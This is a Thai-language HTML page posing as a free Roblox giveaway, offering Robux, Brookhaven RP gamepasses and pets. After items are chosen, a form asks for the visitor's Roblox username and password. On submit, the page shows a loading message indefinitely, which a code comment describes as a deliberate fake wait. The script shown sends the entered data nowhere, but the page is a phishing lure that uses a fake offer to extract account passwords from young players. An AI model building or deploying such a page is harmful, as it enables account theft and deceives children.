<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8" />
<title>แจกของ Roblox 🕹️</title>
<style>
  body {
    font-family: "Sarabun", sans-serif;
    background: #121212;
    color: #eee;
    text-align: center;
    padding: 30px;
  }
  h1, h2 {
    margin-bottom: 20px;
  }
  button {
    padding: 12px 25px;
    margin: 10px 5px;
    font-size: 16px;
    border: none;
    border-radius: 12px;
    cursor: pointer;
    background: #0af;
    color: #000;
    font-weight: bold;
    transition: background 0.3s;
  }
  button:hover {
    background: #08c;
  }
  label {
    display: block;
    margin: 8px 0;
    cursor: pointer;
  }
  input[type="checkbox"] {
    margin-right: 10px;
    transform: scale(1.3);
    vertical-align: middle;
  }
  input[type="text"], input[type="password"] {
    padding: 10px;
    font-size: 16px;
    border-radius: 8px;
    border: none;
    margin: 10px 0;
    width: 300px;
  }
  #form, #loading, .category {
    display: none;
    margin-top: 20px;
    text-align: left;
    max-width: 500px;
    margin-left: auto;
    margin-right: auto;
  }
  #loading {
    font-size: 20px;
    font-weight: bold;
    text-align: center;
  }
  table {
    margin: 0 auto 20px auto;
    border-collapse: collapse;
    color: #eee;
    width: 90%;
    max-width: 700px;
  }
  th, td {
    border: 1px solid #555;
    padding: 8px 12px;
  }
  th {
    background: #222;
  }
</style>
</head>
<body>

<div id="home" style="display:block;">
  <h1>🎉 แจกของ Roblox 🕹️</h1>
  <button onclick="showCategory('robux')">💰 ซื้อ Robux</button>
  <button onclick="showCategory('gamepass')">🎮 เลือก Gamepass Brookhaven RP</button>
  <button onclick="showCategory('pet')">🐾 เลือก Pet เทพๆ</button>
</div>

<div id="robux" class="category">
  <h2>💰 ราคา Robux (ซื้อผ่านเว็บ Roblox)</h2>
  <form id="formRobux">
    <label><input type="checkbox" name="items" value="40 Robux"> 40 Robux (฿20)</label>
    <label><input type="checkbox" name="items" value="80 Robux"> 80 Robux (฿35)</label>
    <label><input type="checkbox" name="items" value="400 Robux"> 400 Robux (฿179)</label>
    <label><input type="checkbox" name="items" value="800 Robux"> 800 Robux (฿359)</label>
    <label><input type="checkbox" name="items" value="1,700 Robux"> 1,700 Robux (฿699)</label>
    <label><input type="checkbox" name="items" value="4,500 Robux"> 4,500 Robux (฿1,750)</label>
    <label><input type="checkbox" name="items" value="10,000 Robux"> 10,000 Robux (฿3,499)</label>
    <br/>
    <button type="button" onclick="toFormMultiple('robux')">ยืนยันเลือกของ</button>
    <button type="button" onclick="backHome()">กลับหน้าแรก</button>
  </form>
</div>

<div id="gamepass" class="category">
  <h2>🎮 Gamepass Brookhaven RP</h2>
  <form id="formGamepass">
    <label><input type="checkbox" name="items" value="VIP Pass"> VIP Pass (999 Robux)</label>
    <label><input type="checkbox" name="items" value="Premium Pass"> Premium Pass (275 Robux)</label>
    <label><input type="checkbox" name="items" value="Estates Unlocked"> Estates Unlocked (799 Robux)</label>
    <label><input type="checkbox" name="items" value="Vehicle Speed Unlocked"> Vehicle Speed Unlocked (199 Robux)</label>
    <label><input type="checkbox" name="items" value="Land Unlocked"> Land Unlocked (500 Robux)</label>
    <label><input type="checkbox" name="items" value="Vehicle Pack"> Vehicle Pack (799 Robux)</label>
    <label><input type="checkbox" name="items" value="Disaster Pack"> Disaster Pack (600 Robux)</label>
    <label><input type="checkbox" name="items" value="Horse Unlocked"> Horse Unlocked (100 Robux)</label>
    <label><input type="checkbox" name="items" value="Boat Pack"> Boat Pack (150 Robux)</label>
    <label><input type="checkbox" name="items" value="Music Unlocked"> Music Unlocked (199 Robux)</label>
    <br/>
    <button type="button" onclick="toFormMultiple('gamepass')">ยืนยันเลือกของ</button>
    <button type="button" onclick="backHome()">กลับหน้าแรก</button>
  </form>
</div>

<div id="pet" class="category">
  <h2>🐾 Pet เทพๆ ใน Brookhaven RP</h2>
  <form id="formPet">
    <label><input type="checkbox" name="items" value="Golden Dragon"> Golden Dragon (1,200 Robux)</label>
    <label><input type="checkbox" name="items" value="Unicorn"> Unicorn (900 Robux)</label>
    <label><input type="checkbox" name="items" value="Shadow Wolf"> Shadow Wolf (850 Robux)</label>
    <label><input type="checkbox" name="items" value="Phoenix"> Phoenix (1,500 Robux)</label>
    <label><input type="checkbox" name="items" value="Cyber Cat"> Cyber Cat (700 Robux)</label>
    <label><input type="checkbox" name="items" value="Dragon Hatchling"> Dragon Hatchling (600 Robux)</label>
    <br/>
    <button type="button" onclick="toFormMultiple('pet')">ยืนยันเลือกของ</button>
    <button type="button" onclick="backHome()">กลับหน้าแรก</button>
  </form>
</div>

<div id="form" style="text-align:center;">
  <h2>กรอกข้อมูลเพื่อรับของ</h2>
  <p>ของที่เลือก: <b id="selectedItems"></b></p>
  <input id="username" type="text" placeholder="ชื่อ Roblox ของคุณ" /><br />
  <input id="code" type="password" placeholder="กรอกรหัสของคุณ" /><br /><br />
  <button onclick="submitForm()">ยืนยัน</button>
  <button onclick="backHome()">ยกเลิก</button>
</div>

<div id="loading">⏳ กำลังดำเนินการ… โปรดรอสักครู่</div>

<script>
  let selectedItemsList = [];

  function showCategory(cat) {
    document.getElementById("home").style.display = "none";
    document.querySelectorAll(".category").forEach(c => c.style.display = "none");
    document.getElementById(cat).style.display = "block";
    document.getElementById("form").style.display = "none";
    document.getElementById("loading").style.display = "none";
  }

  function backHome() {
    selectedItemsList = [];
    document.getElementById("username").value = "";
    document.getElementById("code").value = "";
    document.getElementById("form").style.display = "none";
    document.getElementById("loading").style.display = "none";
    document.getElementById("home").style.display = "block";
    document.querySelectorAll(".category").forEach(c => c.style.display = "none");
  }

  function toFormMultiple(category) {
    let formId = "form" + capitalize(category);
    let checkboxes = document.querySelectorAll("#" + formId + " input[name='items']:checked");
    selectedItemsList = [];
    checkboxes.forEach(cb => selectedItemsList.push(cb.value));
    if(selectedItemsList.length === 0){
      alert("กรุณาเลือกอย่างน้อย 1 รายการนะ!");
      return;
    }
    document.getElementById("selectedItems").innerText = selectedItemsList.join(", ");
    document.querySelectorAll(".category").forEach(c => c.style.display = "none");
    document.getElementById("form").style.display = "block";
  }

  function capitalize(str) {
    return str.charAt(0).toUpperCase() + str.slice(1);
  }

  function submitForm() {
    const username = document.getElementById("username").value.trim();
    const code = document.getElementById("code").value.trim();
    if(username.length < 2){
      alert("กรุณากรอกชื่อ Roblox ให้ถูกต้อง!");
      return;
    }
    if(code.length === 0){
      alert("กรุณากรอกรหัสของคุณด้วย!");
      return;
    }
    document.getElementById("form").style.display = "none";
    document.getElementById("loading").style.display = "block";
    // ค้างหน้าโหลดแบบเนียน ๆ ไม่ไปไหนเลย
  }
</script>

</body>
</html>
